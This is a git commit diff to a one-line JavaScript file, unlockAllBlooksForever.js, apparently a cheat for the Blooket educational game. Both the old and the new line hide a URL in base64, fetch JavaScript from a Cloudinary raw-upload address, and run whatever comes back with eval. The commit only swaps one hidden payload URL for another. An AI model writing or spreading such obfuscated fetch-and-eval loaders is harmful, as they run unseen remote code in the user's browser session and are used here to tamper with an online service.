e91b03e3e8ea975cdc2d1feb5ba5ab8d47b03e9f
rebound37 <92229299+rebound37@users.noreply.github.com>
2021-12-01 16:55:21 -0500

    Update unlockAllBlooksForever.js

--- unlockAllBlooksForever.js
+++ unlockAllBlooksForever.js
@@ -1,1 +1,1 @@
-fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZG0yaG9hNDVxL3Jhdy91cGxvYWQvdjE2MzgzOTQzMDYvdW5sb2NrQWxsUGVybV9yczkxcmguanM=')).then((res) => res.text().then((t) => eval(t)))
+fetch(atob('aHR0cHM6Ly9yZXMuY2xvdWRpbmFyeS5jb20vZG0yaG9hNDVxL3Jhdy91cGxvYWQvdjE2MzgzOTU2OTAvdW5sb2NrQWxsUGVybV96ZXFqbnEuanM=')).then((res) => res.text().then((t) => eval(t)))
